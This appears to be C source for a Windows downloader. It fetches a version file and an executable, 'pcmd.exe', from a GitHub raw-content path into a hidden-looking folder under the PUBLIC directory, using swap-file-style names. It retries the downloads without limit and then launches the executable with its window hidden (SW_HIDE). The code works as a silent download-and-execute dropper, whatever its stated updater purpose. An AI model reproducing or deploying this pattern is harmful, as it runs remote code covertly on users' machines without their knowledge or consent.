#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <unistd.h>
#include <string.h>
#include <__pink/pinkwin.h>
#include <__pink/pfile.h>
#include <__pink/pstruct.h>
#include <__pink/phttp.h>

#ifndef __PINK__
#define __PINK__	-0x50494E4B4B4E4950LL
#endif

int main(){
	int ret;
	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
	char *dir[2]={"/_P_WhiteHat_", "/pcmd_update.~swp~"};
	if(!GlobalBuffer)
		return -1;
	pmkdir(filepath, ps, dir, 1);
	strcat(filepath, dir[1]);
	do{
		ret=pDownload(L"raw.githubusercontent.com", L"2641797006/c/master/_P_whitehat_/~update.swp~", filepath);
	}while(ret!=0);

	int v;
	FILE* fp;
	_WH _wh;
	fp=fopen(filepath, "r");
	if(!fp)
		return -2;
	ret=fscanf(fp, "%*[^0-9]%d", &v);
	fclose(fp);
	if(ret<1)
		return -3;
	pmkdir(filepath, ps, dir, 1);
	strcat(filepath, "/.wh");
	fp=fopen(filepath, "rb");
	if(!fp)
		return -4;
	ret=fread(&_wh, sizeof(_WH), 1, fp);
	fclose(fp);
	if(ret!=1)
		return -5;
	pmkdir(filepath, ps, dir, 1);
	strcat(filepath, "/pcmd.exe");
	if(_wh.version<v)
		do{
			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/c/master/_P_whitehat_/pcmd.exe", filepath);
		}while(ret!=0);
	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
	return 0;
}
